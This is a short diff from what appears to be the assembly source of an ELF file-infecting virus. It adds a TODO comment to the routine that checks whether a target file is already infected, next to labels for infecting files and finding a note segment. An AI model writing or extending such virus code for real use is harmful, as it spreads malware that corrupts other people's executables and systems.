@@ -894,6 +894,7 @@ _infect_file: ; (string rdi, stat rsi)
 			jmp .find_segment_note
 ;
 		.check_if_infected:
+			; TODO: check only at offset + filesz - virus_size
 			push rcx
 			lea rdx, [rel signature]
 			lea rcx, [rel fingerprint]
